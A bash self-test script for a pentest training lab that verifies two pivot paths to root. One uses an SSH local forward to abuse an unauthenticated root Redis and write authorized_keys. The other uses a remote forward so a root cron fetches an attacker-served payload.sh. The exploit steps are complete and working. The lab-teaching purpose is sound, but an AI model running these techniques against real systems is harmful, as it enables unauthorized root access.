#!/usr/bin/env bash
# =============================================================================
#  Road to Root — Pivot lab self-test (Chapter 07 "Local Service + Port Fwd")
#
#  Runs on the ATTACKER box and exercises BOTH forwarding directions:
#    A  LOCAL forward (-L): reach the target's loopback Redis (root, no auth),
#       make it write /root/.ssh/authorized_keys, then ssh in as root.
#    B  REMOTE forward (-R): a root "updater" cron on the target fetches
#       http://127.0.0.1:9000/payload.sh; publish our own web server onto the
#       target's loopback with -R so root runs our script.
#
#     docker cp tests/verify_pivot.sh attacker:/tmp/
#     docker exec attacker bash /tmp/verify_pivot.sh target-pivot
#
#  Exit 0 = both forwarding directions reached root. (CI uses it.)
# =============================================================================
set -u
HOST="${1:-target-pivot}"
PASS="${PIVOT_PASS:-password123}"
FLAG='R2R{'
SSHO="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"
P=0; F=0
pass(){ echo "  [PASS] $1"; P=$((P + 1)); }
fail(){ echo "  [FAIL] $1"; F=$((F + 1)); }

echo "== target: $HOST  (loopback Redis + loopback updater) =="

echo "== wait for ssh on the target =="
up=0
for i in $(seq 1 60); do
  if sshpass -p "$PASS" ssh $SSHO "labuser1@$HOST" true 2>/dev/null; then up=1; break; fi
  sleep 2
done
[ "$up" = 1 ] && echo "  ssh is up" || { echo "  [FAIL] target ssh never came up"; exit 1; }

echo "== control: Redis must NOT be reachable without a tunnel =="
if redis-cli -h "$HOST" -p 6379 ping 2>/dev/null | grep -q PONG; then
  echo "  [WARN] Redis answered directly — it should be loopback-only"
else
  echo "  [PASS] Redis is not directly reachable (loopback-only)"
fi

# ---------------------------------------------------------------------------
echo "== Station A — LOCAL forward (-L):  ssh -L 6379:127.0.0.1:6379 =="
pkill -f 'ssh .* -L 6379' 2>/dev/null || true
sshpass -p "$PASS" ssh $SSHO -f -N -L 6379:127.0.0.1:6379 "labuser1@$HOST"
sleep 2
if redis-cli -h 127.0.0.1 -p 6379 ping 2>/dev/null | grep -q PONG; then
  echo "  tunnel up — Redis reachable at 127.0.0.1:6379 on the attacker"
else
  echo "  [FAIL] could not reach Redis through the local forward"; fail "A  local forward to Redis"
fi
R(){ redis-cli -h 127.0.0.1 -p 6379 "$@"; }
rm -f /tmp/pivkey /tmp/pivkey.pub
ssh-keygen -t ed25519 -f /tmp/pivkey -N '' -q
R flushall >/dev/null
printf '\n\n%s\n\n' "$(cat /tmp/pivkey.pub)" | R -x set pwn >/dev/null
R config set dir /root/.ssh >/dev/null
R config set dbfilename authorized_keys >/dev/null
R save >/dev/null
A_OUT="$(ssh $SSHO -i /tmp/pivkey "root@$HOST" 'id; cat /root/flag.txt' 2>/dev/null)"
echo "$A_OUT" | grep -q "$FLAG" \
  && pass "A  -L -> Redis -> authorized_keys -> root  ($(echo "$A_OUT" | grep -o 'R2R{[^}]*}'))" \
  || fail "A  -L -> Redis -> authorized_keys -> root"
pkill -f 'ssh .* -L 6379' 2>/dev/null || true

# ---------------------------------------------------------------------------
echo "== Station B — REMOTE forward (-R):  publish our server onto target:9000 =="
rm -rf /tmp/webroot && mkdir -p /tmp/webroot
printf 'cp /root/flag.txt /tmp/flag_b; chmod 644 /tmp/flag_b\n' > /tmp/webroot/payload.sh
pkill -f 'http.server 8000' 2>/dev/null || true
( cd /tmp/webroot && nohup python3 -m http.server 8000 >/dev/null 2>&1 & )
sleep 1
pkill -f 'ssh .* -R 9000' 2>/dev/null || true
sshpass -p "$PASS" ssh $SSHO -f -N -R 9000:127.0.0.1:8000 "labuser1@$HOST"
sleep 2
# sanity: from the target, the loopback updater URL now reaches our server
if sshpass -p "$PASS" ssh $SSHO "labuser1@$HOST" 'curl -fs --max-time 5 http://127.0.0.1:9000/payload.sh' 2>/dev/null | grep -q flag_b; then
  echo "  remote forward up — target's 127.0.0.1:9000 now hits our web server"
else
  echo "  [WARN] could not confirm the -R forward from the target side"
fi
echo "  waiting up to ~2 min for the root updater tick"
B_OK=0
for i in $(seq 1 24); do
  if sshpass -p "$PASS" ssh $SSHO "labuser1@$HOST" 'cat /tmp/flag_b 2>/dev/null' 2>/dev/null | grep -q "$FLAG"; then
    B_OK=1; break
  fi
  sleep 5
done
[ "$B_OK" = 1 ] && pass "B  -R -> root updater ran our payload" \
               || fail "B  -R -> root updater ran our payload"
pkill -f 'ssh .* -R 9000' 2>/dev/null || true
pkill -f 'http.server 8000' 2>/dev/null || true

echo "== score =="
echo "  PASS=$P  FAIL=$F   (expected: 2 pass / 0 fail)"
[ "$F" -eq 0 ] && { echo "  BOTH FORWARDING DIRECTIONS REACH ROOT -- OK"; exit 0; } \
               || { echo "  SOME PATHS FAILED"; exit 1; }
